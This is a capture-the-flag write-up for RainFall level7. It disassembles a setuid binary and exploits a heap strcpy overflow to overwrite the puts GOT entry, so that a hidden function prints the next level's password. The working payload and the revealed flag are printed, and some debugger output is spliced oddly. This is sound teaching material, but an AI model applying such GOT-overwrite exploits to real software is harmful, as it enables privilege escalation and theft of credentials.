# The Global Offset Table (or GOT) 

level7@RainFall:~$ file level7 
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
level7@RainFall:~$ 


### gdb 

```bash
level7@RainFall:~$ gdb -q ./level7 
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
(gdb) info function 
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time(gdb) 
x/wx $esp+0x44
0xbffff744:	0xbffff71c
(gdb) x/wx 0xbffff71c
0xbffff71c:	0x0804a008
(gdb) x/64wx 0xbffff71c
0xbffff71c:	0x0804a008	0x08048610	0x00000000	0x00000000
0xbffff72c:	0xb7e454d3	0x00000003	0xbffff7c4	0xbffff7d4
0xbffff73c:	0xb7fdc858	0x00000000	0xbffff71c	0xbffff7d4
0xbffff74c:	0x00000000	0x0804825c	0xb7fd0ff4	0x00000000
0xbffff75c:	0x00000000	0x00000000	0x3c902e43	0x0bd76a53
0xbffff76c:	0x00000000	0x00000000	0x00000000	0x00000003
0xbffff77c:	0x08048440	0x00000000	0xb7ff26b0	0xb7e453e9
0xbffff78c:	0xb7ffeff4	0x00000003	0x08048440	0x00000000
0xbffff79c:	0x08048461	0x08048521	0x00000003	0xbffff7c4
0xbffff7ac:	0x08048610	0x08048680	0xb7fed280	0xbffff7bc
0xbffff7bc:	0xb7fff918	0x00000003	0xbffff8e1	0xbffff8fa
0xbffff7cc:	0xbffff903	0x00000000	0xbffff90c	0xbffff91c
0xbffff7dc:	0xbffff930	0xbffff952	0xbffff965	0xbffff971
0xbffff7ec:	0xbffffe92	0xbffffe9e	0xbffffeeb	0xbfffff01
0xbffff7fc:	0xbfffff10	0xbfffff26	0xbfffff37	0xbfffff40
0xbffff80c:	0xbfffff57	0xbfffff5f	0xbfffff6e	0xbfffffa1

0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
(gdb) disas m 
Dump of assembler code for function m:fopen
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret
(gdb) info var
All defined variables:

Non-debugging symbols:
0x080486d8  _fp_hw
0x080486dc  _IO_stdin_used
0x08048824  __FRAME_END__
0x08049828  __CTOR_LIST__
0x08049828  __init_array_end
0x08049828  __init_array_start
0x0804982c  __CTOR_END__
0x08049830  __DTOR_LIST__
0x08049834  __DTOR_END__
0x08049838  __JCR_END__
0x08049838  __JCR_LIST__
0x0804983c  _DYNAMIC
0x08049908  _GLOBAL_OFFSET_TABLE_
0x08049938  __data_start
0x08049938  data_start
0x0804993c  __dso_handle
0x08049940  completed.6159
0x08049944  dtor_idx.6161
0x08049960  c

```
- allocation anliyses
```bash 
0x0804852a <+9>:  movl   $0x8,(%esp)       ; malloc(8)
0x08048531 <+16>: call   0x80483f0 <malloc@plt>
0x08048536 <+21>: mov    %eax,0x1c(%esp)   ; ptr1 = malloc(8)
0x0804853a <+25>: mov    0x1c(%esp),%eax
0x0804853e <+29>: movl   $0x1,(%eax)       ; *ptr1 = 1 (id=1)
0x08048544 <+35>: movl   $0x8,(%esp)       ; malloc(8)
0x0804854b <+42>: call   0x80483f0 <malloc@plt>
0x08048550 <+47>: mov    %eax,%edx
0x08048552 <+49>: mov    0x1c(%esp),%eax
0x08048556 <+53>: mov    %edx,0x4(%eax)    ; *(ptr1 + 4) = malloc(8) (data pointer)
```
allocat 8 byte stored in ptr and write 1 to *ptr and allocat another 8 byte stor in ptr + 4:

this look like a struct 
```bash

struct chunk {
 int id;
 char *data;
};
``` 

```bash
level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAA BBBB
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                    = 0x0804a008
malloc(8)                                                                    = 0x0804a018
malloc(8)                                                                    = 0x0804a028
malloc(8)                                                                    = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAA")                                          = 0x0804a018
strcpy(0x0804a038, "BBBB")                                                   = 0x0804a038
fopen("/home/user/level8/.pass", "r")                                        = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
the strcpy write to the *data in each struct, then it call the fgets function after the fopen , so it stor the readed content to a variable c in 0x08049960 .


- there is a non called function m which load the variable c and pass it to the printf.

so we need to make the program call the function m to print the c content which is the .pass 
we have the puts call that print "~~" based on output befor leaving the program, we need to find this function GOT entry and to redirect execution to m 

```bash 
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main 
```
the puts is at 0x8049928


```bash 
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
```
the m is at 0x080484f4
next is to Overwrite puts@GOT (0x8049928) with m (0x080484f4):

the ofset based on tehe ltrace is 20 sens *data1 is at 0x0804a018 and *data2 at 0x0804a038, let make sure of that:

```bash
(gdb) run AAAAAAAAAAA BBBB
Starting program: /home/user/level7/level7 AAAAAAAAAAA BBBB

Breakpoint 1, 0x080485eb in main ()
(gdb) info proc map
process 2966
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
	 0x804a000  0x806b000    0x21000        0x0 [heap] # heap start at 0x804a000 ends at 0x806b000
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) x/120wx  0x804a000   # visualise heap content and data right 
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018 # succesive id = 1 and *data (data start at 0x0804a018)
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141 # as expected A  pattern start  (41414141)
0x804a020:	0x00414141	0x00000011	0x00000002	0x0804a038 # id = 2 and *data2 pointer 
0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000 # b pattern (42424242)
0x804a040:	0x00000000	0x00020fc1	0xfbad240c	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0xb7fd1980
0x804a080:	0xffffffff	0x00000000	0x00000000	0x00000000
```

strcpy buffer overfloow allow to reach the second chunk and write to it using this payload will set the put function at data ptr 2

```bash 
$(python -c 'print "A"*20 + "\x28\x99\x04\x08"')
```

```bash
(gdb) run $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') bbbb
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level7/level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') bbbb
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
...

Breakpoint 2, 0x080485eb in main ()
(gdb) x/s 0x08049928
0x8049928 <puts@got.plt>:	 "bbbb"
(gdb) 

```
succesfully write "bbbb" to puts function now lets replace it withe m :

```bash 
$(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

got the password:

```bash 
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1751052361
level7@RainFall:~$ 
```